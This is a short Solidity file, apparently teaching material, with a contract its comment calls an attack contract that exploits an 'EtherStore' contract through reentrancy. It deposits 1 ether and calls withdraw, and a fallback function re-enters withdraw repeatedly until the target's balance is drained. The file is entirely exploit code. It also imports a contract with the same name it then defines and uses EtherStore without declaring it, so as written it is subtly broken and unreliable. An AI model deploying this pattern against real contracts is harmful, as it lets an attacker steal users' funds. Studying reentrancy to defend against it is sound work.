// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.18;

import {CommonReentrancyExample} from "./ReentrancyAttack.sol";

/**
 * @notice This Contract is an Attack COntract which exploits the vulnerability in EtherStore Contract.
 * @author Uba Chris
 */

contract CommonReentrancyExample {
    EtherStore public etherStore;
    uint256 public constant AMOUNT = 1 ether;

    constructor(address _etherStore) {
        etherStore = EtherStore(_etherStore);
    }

    function attack() public payable {
        require(msg.value >= AMOUNT, "MAKE ENOUGH DePOSIT");
        etherStore.deposit{value: AMOUNT}();
        etherStore.withdraw();
    }

    fallback() external payable {
        if (address(etherStore).balance >= AMOUNT) {
            etherStore.withdraw();
        }
    }
}
